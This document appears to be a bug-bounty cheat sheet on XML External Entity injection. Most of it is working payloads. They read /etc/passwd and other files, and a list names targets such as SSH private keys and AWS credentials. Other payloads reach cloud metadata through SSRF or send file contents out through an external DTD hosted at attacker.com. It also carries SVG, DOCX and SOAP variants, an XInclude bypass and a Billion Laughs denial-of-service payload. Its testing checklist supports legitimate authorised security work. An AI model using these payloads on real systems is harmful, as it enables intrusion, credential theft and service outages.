# XML External Entity (XXE) Injection
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
XXE occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser, allowing attackers to read files, perform SSRF, or cause DoS.

## XML Entity Basics

```xml
<!-- Internal entity -->
<!DOCTYPE foo [<!ENTITY xxe "Hello World">]>
<tag>&xxe;</tag>    <!-- renders as "Hello World" -->

<!-- External entity (the attack) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<tag>&xxe;</tag>    <!-- renders contents of /etc/passwd -->
```

---

## Classic XXE (File Read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

### Common Files to Read
```
/etc/passwd           → User accounts
/etc/shadow           → Password hashes (needs root)
/etc/hosts            → Host entries
/proc/self/environ    → Environment variables (may contain secrets)
/proc/self/cmdline    → Process command line
~/.ssh/id_rsa         → SSH private key
~/.aws/credentials    → AWS credentials
/var/www/html/config.php → Database credentials
/app/config/database.yml → Rails database config
/WEB-INF/web.xml      → Java web config
/WEB-INF/classes/application.properties → Spring config
# Windows:
file:///c:/windows/win.ini
```

---

## SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

---

## Blind XXE (Out-of-Band)

When the response doesn't echo the entity value:

### Step 1: Detect Blind XXE via DNS
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.com">
]>
<foo>&xxe;</foo>
```

### Step 2: Exfiltrate Data via External DTD
Create a file at `https://attacker.com/evil.dtd`:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % out "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?d=%data;'>">
%out;
%send;
```

Then inject:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

---

## Parameter Entity Attacks

```xml
<!DOCTYPE foo [
  <!ENTITY % param1 "file:///etc/passwd">
  <!ENTITY % param2 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%param1;'>">
  %param2;
]>
<foo>&exfil;</foo>
```

---

## CDATA Bypass for Special Characters

For files containing special XML characters:
```xml
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % end "]]>">
  <!ENTITY % out "<!ENTITY combined '%start;%file;%end;'>">
  %out;
]>
<foo>&combined;</foo>
```
(Served via external DTD — can't inline nested entity definitions)

---

## XXE via File Upload

### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX XXE
```bash
# Unzip DOCX
unzip document.docx -d docx_extracted/

# Edit word/document.xml — add XXE payload
# Repack
cd docx_extracted/
zip -r ../malicious.docx .
```

---

## XXE via SOAP
```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

---

## XXE Bypass Techniques

### XInclude (No DOCTYPE Required)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

---

## Billion Laughs (DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol9 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<lolz>&lol9;</lolz>
```

---

## Finding XXE

### Where to Look
- Any endpoint that accepts XML input
- SOAP web services
- SVG file upload (SVG is XML)
- Office document upload (DOCX/XLSX/PPTX are ZIP + XML)
- RSS/Atom feed parsers
- JSON APIs that also accept XML (`Content-Type: application/xml`)
- CSV imports, config file uploads, `.gpx` GPS files

### Testing Technique
```bash
# 1. Change Content-Type to XML if currently JSON
Content-Type: application/xml

# 2. Convert JSON body to XML
{"productId": 1}
→
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<productId>&xxe;</productId>
```

---

## Real-World Examples (Yaworski)
- **Google** ($10,000): XXE read access to internal Google files via malicious SVG upload
- **Facebook** ($10,000): XXE via DOCX upload → read internal files
- **Wikiloc** (bounty): XXE via `.gpx` file upload (XML-based GPS format) → `/etc/passwd` read

## Testing Checklist
- [ ] Find XML inputs (SOAP, SVG, file upload, JSON → XML)
- [ ] Test classic file read (file:///etc/passwd)
- [ ] Test SSRF (http://169.254.169.254)
- [ ] Test blind XXE via Burp Collaborator
- [ ] Try external DTD for blind data exfiltration
- [ ] Test XInclude if DOCTYPE blocked
- [ ] Test SVG/Office file upload
- [ ] Try XXE via SOAP body

## Severity
- **Medium**: SSRF to non-sensitive internal services
- **High**: File read (/etc/passwd, config files)
- **High**: Cloud metadata read (credentials)
- **Critical**: SSH keys, AWS credentials, leading to full compromise
